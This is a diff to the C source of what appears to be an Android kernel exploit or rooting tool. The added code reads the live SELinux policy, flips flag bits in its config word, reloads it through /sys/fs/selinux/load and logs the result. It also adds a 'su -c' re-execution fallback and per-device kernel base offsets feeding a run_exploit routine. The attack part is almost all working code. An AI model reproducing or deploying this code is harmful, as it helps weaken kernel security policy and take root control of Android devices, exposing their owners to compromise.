@@ -24,21 +24,171 @@ static int load_policy_mode;
 #define POLICY_REPAIR_PATH BRIDGE_STATE_DIR "/repair_selinux_policy.sh"
 #define POLICY_REPAIR_SOURCE_ENV "ANCHOR_POLICY_REPAIR_SOURCE"
 
+static int fix_selinux_policy_c(const char *stage) {
+  int rfd = open("/sys/fs/selinux/policy", O_RDONLY | O_CLOEXEC);
+  if (rfd < 0) {
+    pr_error("fix_policy_c: open /sys/fs/selinux/policy failed errno=%d\n", errno);
+    return -1;
+  }
+  off_t sz = lseek(rfd, 0, SEEK_END);
+  if (sz <= 20) {
+    close(rfd);
+    pr_error("fix_policy_c: invalid policy size %ld\n", (long)sz);
+    return -1;
+  }
+  lseek(rfd, 0, SEEK_SET);
+  uint8_t *buf = malloc(sz);
+  if (!buf) {
+    close(rfd);
+    pr_error("fix_policy_c: malloc %ld bytes failed\n", (long)sz);
+    return -1;
+  }
+  ssize_t rd = read(rfd, buf, sz);
+  close(rfd);
+  if (rd != sz) {
+    free(buf);
+    pr_error("fix_policy_c: read failed rd=%zd sz=%zd errno=%d\n", rd, (ssize_t)sz, errno);
+    return -1;
+  }
+
+  /* Validate SELinux policydb magic (0xf97cff8c in LE) */
+  if (buf[0] != 0x8c || buf[1] != 0xff || buf[2] != 0x7c || buf[3] != 0xf9) {
+    free(buf);
+    pr_error("fix_policy_c: bad magic %02x%02x%02x%02x\n", buf[0], buf[1], buf[2], buf[3]);
+    return -1;
+  }
+
+  uint32_t id_len = 0;
+  memcpy(&id_len, buf + 4, 4);
+  if (id_len == 0 || id_len > 256) {
+    free(buf);
+    pr_error("fix_policy_c: invalid id_len %u\n", id_len);
+    return -1;
+  }
+
+  size_t config_off = 4 + 4 + id_len + 4;
+  if (config_off + 4 > (size_t)sz) {
+    free(buf);
+    pr_error("fix_policy_c: config_off out of range (%zu > %zu)\n", config_off + 4, (size_t)sz);
+    return -1;
+  }
+
+  uint32_t original_config = 0;
+  memcpy(&original_config, buf + config_off, 4);
+  uint32_t fixed_config = original_config | 0xC0000000U;
+  memcpy(buf + config_off, &fixed_config, 4);
+  pr_info("fix_policy_c: config 0x%08x -> 0x%08x (offset 0x%zx)\n", original_config, fixed_config, config_off);
+
+  /* Single-syscall atomic write to /sys/fs/selinux/load */
+  int wfd = open("/sys/fs/selinux/load", O_WRONLY | O_CLOEXEC);
+  if (wfd < 0) {
+    free(buf);
+    pr_error("fix_policy_c: open /sys/fs/selinux/load failed errno=%d\n", errno);
+    return -1;
+  }
+  ssize_t wr = write(wfd, buf, sz);
+  close(wfd);
+  free(buf);
+
+  if (wr != sz) {
+    pr_error("fix_policy_c: write /sys/fs/selinux/load failed wr=%zd sz=%zd errno=%d\n", wr, (ssize_t)sz, errno);
+    return -1;
+  }
+
+  pr_success("fix_policy_c: loaded %zd bytes to /sys/fs/selinux/load successfully\n", wr);
+
+  /* Restore enforcing */
+  int efd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
+  if (efd >= 0) {
+    write(efd, "1", 1);
+    close(efd);
+  }
+
+  /* Atomically write policy-repair.state */
+  mkdir("/data/adb", 0700);
+  mkdir(BRIDGE_STATE_DIR, 0700);
+  chmod(BRIDGE_STATE_DIR, 0700);
+  char tmp_state[160];
+  snprintf(tmp_state, sizeof(tmp_state), BRIDGE_STATE_DIR "/policy-repair.state.tmp.%ld", (long)getpid());
+  int sfd = open(tmp_state, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+  if (sfd >= 0) {
+    time_t now = time(NULL);
+    struct tm tm_info;
+    char time_buf[64] = "unknown";
+    if (localtime_r(&now, &tm_info)) {
+      strftime(time_buf, sizeof(time_buf), "%Y-%m-%dT%H:%M:%S%z", &tm_info);
+    }
+    dprintf(sfd,
+            "result=success\n"
+            "stage=%s\n"
+            "original_config=0x%08x\n"
+            "fixed_config=0x%08x\n"
+            "load_method=c_native_direct_load\n"
+            "load_policy_rc=0\n"
+            "selinux=Enforcing\n"
+            "timestamp=%s\n",
+            stage ? stage : "immediate", original_config, fixed_config, time_buf);
+    fsync(sfd);
+    fchown(sfd, 0, 0);
+    fchmod(sfd, 0600);
+    close(sfd);
+    rename(tmp_state, BRIDGE_STATE_DIR "/policy-repair.state");
+  }
+
+  /* Append to run log */
+  int lfd = open(BRIDGE_STATE_DIR "/policy-repair.log", O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0600);
+  if (lfd >= 0) {
+    dprintf(lfd,
+            "\n===== policy repair started: stage=%s pid=%ld =====\n"
+            "policy repair: config 0x%08x -> 0x%08x (verified)\n"
+            "policy repair: successfully loaded via C native direct write to /sys/fs/selinux/load\n"
+            "===== policy repair finished: status=0 method=c_native_direct_load =====\n",
+            stage ? stage : "immediate", (long)getpid(), original_config, fixed_config);
+    fchown(lfd, 0, 0);
+    fchmod(lfd, 0600);
+    close(lfd);
+  }
+
+  return 0;
+}
+
 static int run_policy_repair_with_retries(const char *stage) {
+  if (getuid() == 0) {
+    if (fix_selinux_policy_c(stage) == 0) {
+      pr_success("policy repair %s success (c_native)\n", stage);
+      return 0;
+    }
+  }
+
   for (int attempt = 1; attempt <= 5; ++attempt) {
+    pr_info("policy repair %s attempt %d/5\n", stage, attempt);
+
+    char self_exe[PATH_MAX] = "";
+    ssize_t self_len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
+    if (self_len > 0) {
+      self_exe[self_len] = '\0';
+      char cmd_native[PATH_MAX + 64];
+      snprintf(cmd_native, sizeof(cmd_native), "su -c '\"%s\" --fix-policy %s'", self_exe, stage);
+      int native_rc = system(cmd_native);
+      if (native_rc == 0) {
+        pr_success("policy repair %s success (c_native su)\n", stage);
+        return 0;
+      }
+    }
+
     char command[192];
     int length = snprintf(command, sizeof(command),
                           "su -c 'ANCHOR_POLICY_REPAIR_STAGE=%s %s'",
                           stage, POLICY_REPAIR_PATH);
-    if (length < 0 || (size_t)length >= sizeof(command)) return -1;
-    pr_info("policy repair %s attempt %d/5\n", stage, attempt);
-    int rc = system(command);
-    if (rc == 0) {
-      pr_success("policy repair %s success\n", stage);
-      return 0;
+    if (length > 0 && (size_t)length < sizeof(command)) {
+      int rc = system(command);
+      if (rc == 0) {
+        pr_success("policy repair %s success (script)\n", stage);
+        return 0;
+      }
+      pr_error("policy repair %s attempt %d/5 failed rc=%d\n", stage, attempt,
+               rc);
     }
-    pr_error("policy repair %s attempt %d/5 failed rc=%d\n", stage, attempt,
-             rc);
     if (attempt != 5) sleep(1);
   }
   return -1;
@@ -996,6 +1146,9 @@ int run_exploit(int argc, char **argv) {
 
   kaslr_slide = 0;
   kaslr_base = KIMAGE_TEXT_BASE;
+  if (active_offsets && active_offsets->kimage_text_base) {
+    kaslr_base = active_offsets->kimage_text_base;
+  }
   kaslr_done = 1;
 
   timer_reset();
@@ -1279,6 +1432,9 @@ static int run_write1_only(void) {
   pin_to_core(CORE);
   kaslr_slide = 0;
   kaslr_base = KIMAGE_TEXT_BASE;
+  if (active_offsets && active_offsets->kimage_text_base) {
+    kaslr_base = active_offsets->kimage_text_base;
+  }
   kaslr_done = 1;
 
   if (check_selinux_off()) {
@@ -1310,6 +1466,9 @@ int main(int argc, char **argv) {
       else if (strcmp(argv[i], "--load-policy") == 0) load_policy_mode = 1;
       else if (strcmp(argv[i], "--bootstrap") == 0) bootstrap = 1;
       else if (strcmp(argv[i], "--write1") == 0) write1 = 1;
+    }
+    if (argc >= 2 && strcmp(argv[1], "--fix-policy") == 0) {
+      return fix_selinux_policy_c(argc >= 3 ? argv[2] : "immediate");
     }
     if (bootstrap)
         return run_bootstrap();
